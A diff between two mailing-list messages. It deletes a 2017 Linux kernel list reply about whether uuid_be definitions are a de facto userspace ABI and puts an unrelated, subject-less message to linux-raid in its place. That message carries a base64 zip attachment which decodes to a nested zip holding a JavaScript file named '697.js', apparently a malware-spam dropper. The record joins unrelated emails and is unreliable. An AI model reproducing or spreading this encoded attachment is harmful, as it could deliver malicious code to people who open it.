@@ -1,39 +1,65 @@
-From: David Howells <dhowells-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
-Subject: Re: [PATCH 03/23] uuid: remove uuid_be defintions from the uapi header
-Date: Fri, 19 May 2017 11:58:41 +0100
-Message-ID: <13041.1495191521@warthog.procyon.org.uk>
-References: <20170518071352.GA515@lst.de> <20170518062705.25902-1-hch@lst.de>
- <20170518062705.25902-4-hch@lst.de> <1495091565.31562.28.camel@perches.com>
+From: <citydesk@thereporteronline.com>
+Subject: (unknown)
+Date: Fri, 19 May 2017 14:51:36 -0000
+Message-ID: <149520549690.27289.14021776986205360374@masmovil.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Return-path: <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-In-Reply-To: <20170518071352.GA515-jcswGhMUV9g@public.gmane.org>
-Content-ID: <13040.1495191521.1-S6HVgzuS8uM4Awkfq6JHfwNdhmdF6hFW@public.gmane.org>
-List-Unsubscribe: <https://lists.01.org/mailman/options/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=unsubscribe>
-List-Archive: <http://lists.01.org/pipermail/linux-nvdimm/>
-List-Post: <mailto:linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-List-Help: <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=help>
-List-Subscribe: <https://lists.01.org/mailman/listinfo/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=subscribe>
-Errors-To: linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org
-Sender: "Linux-nvdimm" <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-To: Christoph Hellwig <hch-jcswGhMUV9g@public.gmane.org>
-Cc: linux-xfs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-raid-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org, Mimi Zohar <zohar-23VcF4HTsmIX0ybBhKVfKdBPR1lH4CV8@public.gmane.org>, Amir Goldstein <amir73il-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, dhowells-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org, linux-fsdevel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-api-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Joe Perches <joe-6d6DIl74uiNBDgjK7y7TUQ@public.gmane.org>, Andy Shevchenko <andriy.shevchenko-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>, Shaohua Li <shli-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, Steven Whitehouse <swhiteho-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
+Content-Type: application/zip; name="128734285588468.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-raid-owner@vger.kernel.org>
+Content-Disposition: attachment
+Subject: 
+Sender: linux-raid-owner@vger.kernel.org
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-Christoph Hellwig <hch-jcswGhMUV9g@public.gmane.org> wrote:
-
-> It's not a userspace ABI, so by defintion it does not break an
-> existing user program.
-
-That's an invalid assumption.  It is a de facto userspace ABI as it has been
-exposed in /usr/include/linux/uuid.h for some time.
-
-> If someone was using it they should be using uuid_t from libuuid instead, as
-> that gives them the routines to deal with it.
-
-Yes, they should - but that doesn't mean they do.
-
-David
+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
